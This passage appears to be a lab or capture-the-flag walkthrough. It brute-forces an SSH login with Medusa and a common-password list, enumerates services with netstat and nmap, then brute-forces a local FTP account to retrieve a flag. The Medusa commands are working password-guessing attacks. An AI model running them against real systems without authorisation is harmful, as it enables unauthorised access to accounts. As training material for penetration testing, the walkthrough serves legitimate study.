We begin our exploration by targeting an SSH server running on a remote system.
Assuming prior knowledge of the username `sshuser`, we can leverage Medusa to attempt different password combinations until successful authentication is achieved systematically.

```shell
medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3


ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t [SUCCESS]
```

## Gaining Access
With the password in hand, establish an SSH connection.

### Expanding the Attack Surface
Once inside the system, the next step is identifying other potential attack surfaces. Using `netstat` (within the SSH session) to list open ports and listening services, you discover a service running on port 21.
```shell
ssh> netstat -tulpn | grep LISTEN

tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::21                   :::*       
```

Further reconnaissance with `nmap` (within the SSH session) confirms this finding as an ftp server.

```shell
ssh> nmap localhost

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
```

### Targeting the FTP Server
If we explore the `/home` directory on the target system, we see an `ftpuser` folder, which implies the likelihood of the FTP server username being `ftpuser`. Based on this, we can modify our Medusa command accordingly:
```shell
ssh> medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```
```
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ... Password: ... [SUCCESS]
```

### Retrieving The Flag
```shell
ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
```